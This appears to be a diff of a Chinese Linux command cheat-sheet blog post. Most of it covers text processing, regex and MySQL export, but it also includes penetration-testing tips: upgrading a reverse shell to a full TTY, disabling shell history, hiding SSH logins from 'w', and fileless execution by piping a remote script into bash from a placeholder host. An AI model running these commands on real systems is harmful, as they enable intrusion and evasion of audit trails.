@@ -28,7 +28,7 @@
 <meta property="og:description" content="linux部分命令速查 for me。 命令行的艺术">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-04-14T04:41:08.000Z">
-<meta property="article:modified_time" content="2021-01-19T06:17:53.318Z">
+<meta property="article:modified_time" content="2021-03-25T08:31:59.158Z">
 <meta property="article:author" content="atsud0">
 <meta property="article:tag" content="Linux">
 <meta name="twitter:card" content="summary">
@@ -142,17 +142,17 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">177</span></a>
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">179</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">11</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">12</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">138</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">142</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -241,7 +241,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-01-19 14:17:53" itemprop="dateModified" datetime="2021-01-19T14:17:53+08:00">2021-01-19</time>
+                <time title="Modified: 2021-03-25 16:31:59" itemprop="dateModified" datetime="2021-03-25T16:31:59+08:00">2021-03-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -266,14 +266,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>4.2k</span>
+              <span>5k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>4 mins.</span>
+              <span>5 mins.</span>
             </span>
 
         </div>
@@ -295,15 +295,11 @@
 <h3 id="显示某个文件的第几行"><a href="#显示某个文件的第几行" class="headerlink" title="显示某个文件的第几行"></a>显示某个文件的第几行</h3><p>显示文件的5到20行<br><code>sed -n &#39;5,20p&#39; firename</code></p>
 <h3 id="删除文本换行符和空格"><a href="#删除文本换行符和空格" class="headerlink" title="删除文本换行符和空格"></a>删除文本换行符和空格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#39;&#123;printf(&quot;%s&quot;,$0)&#125;&#39; tmp.txt | sed &#39;s&#x2F;\ &#x2F;&#x2F;g&#39; $1</span><br></pre></td></tr></table></figure>
 
-<h3 id="linux-下删除文本空行"><a href="#linux-下删除文本空行" class="headerlink" title="linux 下删除文本空行"></a>linux 下删除文本空行</h3><p>grep</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v &#39;^$&#39; file</span><br></pre></td></tr></table></figure>
-<p>sed</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#39;&#x2F;^$&#x2F;d&#39; file</span><br></pre></td></tr></table></figure>
-<p> awk</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#39;&#x2F;.&#x2F; &#123;print&#125;&#39; file 或 awk &#39;&#123;if($0!&#x3D;&quot; &quot;) print&#125;&#39;</span><br></pre></td></tr></table></figure>
-<p>tr</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tr -s &quot;n&quot;</span><br></pre></td></tr></table></figure>
-<p>除此之外，vim也可以在查看时。通过命令模式删除空行。vim在命令模式下输入：</p>
+<h3 id="linux-下删除文本空行"><a href="#linux-下删除文本空行" class="headerlink" title="linux 下删除文本空行"></a>linux 下删除文本空行</h3><h4 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v &#39;^$&#39; file</span><br></pre></td></tr></table></figure>
+<h4 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#39;&#x2F;^$&#x2F;d&#39; file</span><br></pre></td></tr></table></figure>
+<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#39;&#x2F;.&#x2F; &#123;print&#125;&#39; file 或 awk &#39;&#123;if($0!&#x3D;&quot; &quot;) print&#125;&#39;</span><br></pre></td></tr></table></figure>
+<h4 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tr -s &quot;n&quot;</span><br><span class="line"></span><br><span class="line">tr &quot;\n&quot; &quot; &quot; #替换为空格</span><br></pre></td></tr></table></figure>
+<h4 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h4><p>除此之外，vim也可以在查看时。通过命令模式删除空行。vim在命令模式下输入：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s&#x2F;^n&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure>
 <p>意思是全局替换所有以回车开头的字符，替换为空。如果有多个连续的空行，想保留一行。则只需在命令行模式输入下行即可：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s&#x2F;^n$&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure>
@@ -341,10 +337,8 @@
 
 
 
-<h3 id="python打开tty"><a href="#python打开tty" class="headerlink" title="python打开tty"></a>python打开tty</h3><a href="https://cloud.tencent.com/developer/article/1047405" title="" target="">如何将简单的Shell转换成为完全交互式的TTY</a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
-
-<h3 id="没有python怎么打开tty"><a href="#没有python怎么打开tty" class="headerlink" title="没有python怎么打开tty?"></a>没有python怎么打开tty?</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;bash script -q &#x2F;dev&#x2F;null</span><br><span class="line">Ctrl-Z</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line">reset</span><br><span class="line">xterm</span><br></pre></td></tr></table></figure>
+<h3 id="python打开tty，nc升级完全交互式的TTY"><a href="#python打开tty，nc升级完全交互式的TTY" class="headerlink" title="python打开tty，nc升级完全交互式的TTY"></a>python打开tty，nc升级完全交互式的TTY</h3><a href="https://cloud.tencent.com/developer/article/1047405" title="" target="">如何将简单的Shell转换成为完全交互式的TTY</a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># In reverse shell</span><br><span class="line"></span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line"></span><br><span class="line">目标系统没有python时可用:SHELL&#x3D;&#x2F;bin&#x2F;bash script -q &#x2F;dev&#x2F;null </span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line"># In Kali</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line"></span><br><span class="line"># In reverse shell</span><br><span class="line">reset</span><br><span class="line">xterm</span><br><span class="line">export TERM&#x3D;xterm</span><br><span class="line">stty rows 48 cols 99</span><br></pre></td></tr></table></figure>
 
 <h3 id="python部署简易网站"><a href="#python部署简易网站" class="headerlink" title="python部署简易网站"></a>python部署简易网站</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer # 不指定端口默认8000</span><br><span class="line">python -m http.server</span><br><span class="line">python3 -m updog --ssl --password 123456 -p 80 #不是自带库，需要安装。</span><br></pre></td></tr></table></figure>
 
@@ -357,7 +351,7 @@
 <h3 id="渗透过程中不记录历史命令"><a href="#渗透过程中不记录历史命令" class="headerlink" title="渗透过程中不记录历史命令"></a>渗透过程中不记录历史命令</h3><p><code>export HISTFILE=/dev/null</code> 将HISTFILE设置为/dev/null</p>
 <p><code>cat | zsh</code>隐身模式。</p>
 <p>避免登录被记录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@127.0.0.1 sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@127.0.0.1</span><br><span class="line"></span><br><span class="line">#进去后是没有交互式终端的，可以自己用nc会话升级的办法升级。升级之后w也是查看不到在已登陆用户。</span><br></pre></td></tr></table></figure>
 
 <h3 id="无文件落地执行"><a href="#无文件落地执行" class="headerlink" title="无文件落地执行"></a>无文件落地执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L http://aaaa.com/a.sh|bash</span><br><span class="line">/bin/bash -c <span class="string">"<span class="variable">$(curl -fsSL https://aaaa/a.sh)</span>"</span></span><br></pre></td></tr></table></figure>
 
@@ -387,7 +381,13 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup tcpdump -i eth0 -w a.pcap &amp;</span><br></pre></td></tr></table></figure>
 
 <p>之后tcpdump用户就会执行这个进程，在你ssh会话挂了之后此任务还会继续进行。</p>
+<h3 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">提取一段内容中的所有IP地址</span><br><span class="line">((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;</span><br><span class="line">判断字符串是否是IP地址</span><br><span class="line">^((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;$</span><br><span class="line">提取md5hash</span><br><span class="line">[0-9a-fA-F]&#123;32&#125;</span><br></pre></td></tr></table></figure>
 
+<h3 id="mysql查询结果写到文件"><a href="#mysql查询结果写到文件" class="headerlink" title="mysql查询结果写到文件"></a>mysql查询结果写到文件</h3><h4 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(1) from table  into outfile &#39;&#x2F;tmp&#x2F;test.xls&#39;;</span><br></pre></td></tr></table></figure>
+<p>有可能就英文secure_file_priv或者是mysql权限的原因导致无法写入。</p>
+<h4 id="命令行写"><a href="#命令行写" class="headerlink" title="命令行写"></a>命令行写</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -u root -p XXXX -P 3306 -e &quot;select * from database.table&quot;  &gt; &#x2F;tmp&#x2F;test&#x2F;txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="ssh-keygen生产私钥对"><a href="#ssh-keygen生产私钥对" class="headerlink" title="ssh-keygen生产私钥对"></a>ssh-keygen生产私钥对</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen rsa 4096 -f a.key</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -488,7 +488,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#查看用户-用户组"><span class="nav-number">1.</span> <span class="nav-text">查看用户|用户组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#显示某个文件的第几行"><span class="nav-number">2.</span> <span class="nav-text">显示某个文件的第几行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删除文本换行符和空格"><span class="nav-number">3.</span> <span class="nav-text">删除文本换行符和空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-下删除文本空行"><span class="nav-number">4.</span> <span class="nav-text">linux 下删除文本空行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-shell-字符串反转-rev"><span class="nav-number">5.</span> <span class="nav-text">linux shell 字符串反转 rev</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-shell-base64"><span class="nav-number">6.</span> <span class="nav-text">linux shell base64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查找SUID位的文件"><span class="nav-number">7.</span> <span class="nav-text">查找SUID位的文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看Linux内核-系统版本"><span class="nav-number">8.</span> <span class="nav-text">查看Linux内核&#x2F;系统版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-部分用法"><span class="nav-number">9.</span> <span class="nav-text">curl 部分用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wget部分用法"><span class="nav-number">10.</span> <span class="nav-text">wget部分用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python打开tty"><span class="nav-number">11.</span> <span class="nav-text">python打开tty</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#没有python怎么打开tty"><span class="nav-number">12.</span> <span class="nav-text">没有python怎么打开tty?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python部署简易网站"><span class="nav-number">13.</span> <span class="nav-text">python部署简易网站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-wget-不验证证书进行https请求"><span class="nav-number">14.</span> <span class="nav-text">curl wget 不验证证书进行https请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置term"><span class="nav-number">15.</span> <span class="nav-text">设置term</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Arch-查询滚了多少次-…"><span class="nav-number">16.</span> <span class="nav-text">Arch 查询滚了多少次(…)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透过程中不记录历史命令"><span class="nav-number">17.</span> <span class="nav-text">渗透过程中不记录历史命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无文件落地执行"><span class="nav-number">18.</span> <span class="nav-text">无文件落地执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dos格式文件快速转为Unix"><span class="nav-number">19.</span> <span class="nav-text">Dos格式文件快速转为Unix</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux使用impakcet快速开启一个SMB共享目录"><span class="nav-number">20.</span> <span class="nav-text">Linux使用impakcet快速开启一个SMB共享目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PIP下载文件"><span class="nav-number">21.</span> <span class="nav-text">PIP下载文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#whois传输文件"><span class="nav-number">22.</span> <span class="nav-text">whois传输文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#切换java版本"><span class="nav-number">23.</span> <span class="nav-text">切换java版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编译32位且动态链接库文件很老的二进制文件"><span class="nav-number">24.</span> <span class="nav-text">编译32位且动态链接库文件很老的二进制文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nohup"><span class="nav-number">25.</span> <span class="nav-text">nohup</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#查看用户-用户组"><span class="nav-number">1.</span> <span class="nav-text">查看用户|用户组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#显示某个文件的第几行"><span class="nav-number">2.</span> <span class="nav-text">显示某个文件的第几行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删除文本换行符和空格"><span class="nav-number">3.</span> <span class="nav-text">删除文本换行符和空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-下删除文本空行"><span class="nav-number">4.</span> <span class="nav-text">linux 下删除文本空行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#grep"><span class="nav-number">4.1.</span> <span class="nav-text">grep</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sed"><span class="nav-number">4.2.</span> <span class="nav-text">sed</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#awk"><span class="nav-number">4.3.</span> <span class="nav-text">awk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tr"><span class="nav-number">4.4.</span> <span class="nav-text">tr</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vim"><span class="nav-number">4.5.</span> <span class="nav-text">vim</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-shell-字符串反转-rev"><span class="nav-number">5.</span> <span class="nav-text">linux shell 字符串反转 rev</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-shell-base64"><span class="nav-number">6.</span> <span class="nav-text">linux shell base64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查找SUID位的文件"><span class="nav-number">7.</span> <span class="nav-text">查找SUID位的文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看Linux内核-系统版本"><span class="nav-number">8.</span> <span class="nav-text">查看Linux内核&#x2F;系统版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-部分用法"><span class="nav-number">9.</span> <span class="nav-text">curl 部分用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wget部分用法"><span class="nav-number">10.</span> <span class="nav-text">wget部分用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python打开tty，nc升级完全交互式的TTY"><span class="nav-number">11.</span> <span class="nav-text">python打开tty，nc升级完全交互式的TTY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python部署简易网站"><span class="nav-number">12.</span> <span class="nav-text">python部署简易网站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-wget-不验证证书进行https请求"><span class="nav-number">13.</span> <span class="nav-text">curl wget 不验证证书进行https请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置term"><span class="nav-number">14.</span> <span class="nav-text">设置term</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Arch-查询滚了多少次-…"><span class="nav-number">15.</span> <span class="nav-text">Arch 查询滚了多少次(…)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透过程中不记录历史命令"><span class="nav-number">16.</span> <span class="nav-text">渗透过程中不记录历史命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无文件落地执行"><span class="nav-number">17.</span> <span class="nav-text">无文件落地执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dos格式文件快速转为Unix"><span class="nav-number">18.</span> <span class="nav-text">Dos格式文件快速转为Unix</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux使用impakcet快速开启一个SMB共享目录"><span class="nav-number">19.</span> <span class="nav-text">Linux使用impakcet快速开启一个SMB共享目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PIP下载文件"><span class="nav-number">20.</span> <span class="nav-text">PIP下载文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#whois传输文件"><span class="nav-number">21.</span> <span class="nav-text">whois传输文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#切换java版本"><span class="nav-number">22.</span> <span class="nav-text">切换java版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编译32位且动态链接库文件很老的二进制文件"><span class="nav-number">23.</span> <span class="nav-text">编译32位且动态链接库文件很老的二进制文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nohup"><span class="nav-number">24.</span> <span class="nav-text">nohup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#正则"><span class="nav-number">25.</span> <span class="nav-text">正则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql查询结果写到文件"><span class="nav-number">26.</span> <span class="nav-text">mysql查询结果写到文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#into-outfile"><span class="nav-number">26.1.</span> <span class="nav-text">into outfile</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令行写"><span class="nav-number">26.2.</span> <span class="nav-text">命令行写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh-keygen生产私钥对"><span class="nav-number">27.</span> <span class="nav-text">ssh-keygen生产私钥对</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -504,20 +504,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">138</span>
+          <span class="site-state-item-count">142</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/index.html">
           
-        <span class="site-state-item-count">177</span>
+        <span class="site-state-item-count">179</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -587,13 +587,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">429k</span>
+    <span title="Symbols count total">437k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">6:30</span>
+    <span title="Reading time total">6:37</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
   </div>
